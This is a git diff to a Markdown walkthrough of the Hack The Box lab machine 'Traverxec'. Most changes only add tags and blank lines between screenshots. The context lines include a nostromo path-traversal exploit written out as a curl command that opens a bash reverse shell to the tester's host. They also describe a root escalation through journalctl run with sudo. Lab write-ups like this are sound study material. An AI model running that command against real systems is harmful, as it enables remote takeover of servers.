@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-linux
     weight: 10
 hero: images/traverxec.png
-tags: ["HTB"]
+tags: ["HTB", "nostromo", "searchsploit", "htpasswd", "hashcat", "ssh", "john", "gtfobins", "journalctrl"]
 ---
 
 # Traverxec
@@ -69,11 +69,13 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
   - Check `searchsploit`
 
 ![](./images/2.png)
+
 ![](./images/3.png)
 
 - We can test `poc`
 
 ![](./images/4.png)
+
 ![](./images/5.png)
 
 - It works
@@ -81,6 +83,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
   - `curl -s -X POST 'http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.7/6666 0>&1"'`
 
 ![](./images/6.png)
+
 ![](./images/7.png)
 
 ## User
@@ -93,6 +96,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
     - `su` doesn't work
 
 ![](./images/8.png)
+
 ![](./images/9.png)
 
 - In `nhttpd.conf` we can see `homedirs` parameter set to `/home`
@@ -129,6 +133,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
   - We see `bin` folder with script inside
 
 ![](./images/16.png)
+
 ![](./images/17.png)
 
 - We see that `journalctl` is executed as `sudo`
@@ -144,4 +149,5 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
   - And we can type `!/bin/bash` to get us a root shell
 
 ![](./images/19.png)
+
 ![](./images/20.png)
